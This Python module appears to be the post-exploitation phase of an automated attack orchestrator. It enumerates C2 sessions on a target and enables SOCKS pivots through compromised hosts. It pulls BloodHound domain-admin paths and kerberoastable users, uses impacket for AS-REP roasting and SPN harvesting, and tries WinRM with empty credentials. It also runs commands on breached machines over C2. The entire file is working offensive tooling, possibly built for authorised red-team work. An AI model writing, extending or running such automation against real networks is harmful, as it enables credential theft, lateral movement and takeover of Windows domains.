import time
import logging

from orchestrator.brain.phases.models import Finding, PhaseResult, Severity
from orchestrator.postex.winrm_exploit import WinRMExploit
from orchestrator.postex.bloodhound_integration import BloodHoundIntegration
from orchestrator.c2.manager import get_c2
from orchestrator.pivot.manager import get_pivot, PivotHop
from orchestrator.ad.toolkit import get_ad_toolkit

logger = logging.getLogger("phase_postex")


async def run_postex(target: str, findings: list[Finding] = None,
                     winrm: WinRMExploit = None,
                     bloodhound: BloodHoundIntegration = None) -> PhaseResult:
    t0 = time.time()
    postex_findings = []
    c2 = get_c2()
    pivot = get_pivot()
    ad = get_ad_toolkit()
    proxy_env = pivot.env_for_target(target)

    sessions = await c2.refresh_sessions()
    local_sessions = [s for s in sessions if target in s.address or target in s.hostname]

    for s in local_sessions:
        postex_findings.append(Finding(
            phase="postex", type="c2_session_active", target=target,
            host=s.address, severity=Severity.HIGH,
            description=f"Active C2 session on {s.hostname} ({s.os})",
            evidence=f"transport: {s.transport} | last checkin: {s.last_checkin}",
        ))
        if not s.proxy_url:
            proxy = await c2.socks_enable(s.id)
            if proxy:
                pivot.add_hop(PivotHop(
                    session_id=s.id, hostname=s.hostname,
                    address=s.address, proxy_url=proxy,
                ))
                postex_findings.append(Finding(
                    phase="postex", type="pivot_enabled", target=target,
                    host=s.address, severity=Severity.INFO,
                    description=f"SOCKS proxy through {s.hostname}",
                    evidence=f"proxy: {proxy}",
                ))

    bh = bloodhound or BloodHoundIntegration()
    if bh.available:
        try:
            da_path = bh.find_da()
            if da_path and not da_path.get("simulated"):
                for step in (da_path.get("path") or da_path.get("paths", []))[:5]:
                    postex_findings.append(Finding(
                        phase="postex", type="ad_attack_path", target=target,
                        severity=Severity.HIGH,
                        description=f"DA path: {step.get('description', str(step)[:100])}",
                        evidence=str(step)[:300],
                    ))

            kerberoast = bh.run_query("kerberoastable")
            if kerberoast and not kerberoast.get("simulated"):
                for user in (kerberoast.get("results") or [])[:10]:
                    postex_findings.append(Finding(
                        phase="postex", type="kerberoastable_user", target=target,
                        severity=Severity.HIGH,
                        description=f"Kerberoastable: {user.get('name', str(user))}",
                        evidence=str(user)[:300],
                    ))
        except Exception as e:
            logger.warning(f"BH query failed: {e}")

    if ad.has_impacket:
        try:
            np_result = ad.get_np_users(target, target, proxy_env)
            if np_result.get("asrep_users"):
                for u in np_result["asrep_users"][:10]:
                    postex_findings.append(Finding(
                        phase="postex", type="asrep_roastable", target=target,
                        severity=Severity.HIGH,
                        description=f"AS-REP roastable: {u}",
                        evidence=str(np_result.get("stdout", ""))[:300],
                        raw=np_result,
                    ))

            spn_result = ad.get_user_spns(target, target, proxy_env=proxy_env)
            if spn_result.get("spns"):
                for spn in spn_result["spns"][:10]:
                    postex_findings.append(Finding(
                        phase="postex", type="kerberoastable_spn", target=target,
                        severity=Severity.HIGH,
                        description=f"SPN: {spn}",
                        evidence=str(spn_result.get("stdout", ""))[:300],
                    ))
        except Exception as e:
            logger.warning(f"Impacket attack failed: {e}")

    has_winrm = any(f.port in (5985, 5986) for f in (findings or []) if f.port)
    if has_winrm:
        winrm_exploit = winrm or WinRMExploit()
        try:
            result = winrm_exploit.connect(target, username="", password="")
            if not result.get("error"):
                postex_findings.append(Finding(
                    phase="postex", type="winrm_access", target=target,
                    severity=Severity.CRITICAL,
                    description="WinRM accessible",
                    evidence=str(result)[:500],
                ))
        except Exception:
            pass

    for s in local_sessions:
        for cmd in ["whoami", "hostname", "ipconfig"]:
            result = await c2.execute(s.id, cmd)
            if result.output:
                postex_findings.append(Finding(
                    phase="postex", type="session_enum", target=target,
                    host=s.address, severity=Severity.INFO,
                    description=f"$ {cmd}",
                    evidence=result.output[:500],
                ))

    latency = time.time() - t0
    return PhaseResult(
        phase="postex",
        success=len(postex_findings) > 0,
        findings=postex_findings,
        summary=f"Post-ex: {len(local_sessions)} active sessions, {len(postex_findings)} findings",
        raw_output=f"sessions: {len(local_sessions)} | bh: {bh.available} | impacket: {ad.has_impacket}",
        latency=latency,
    )
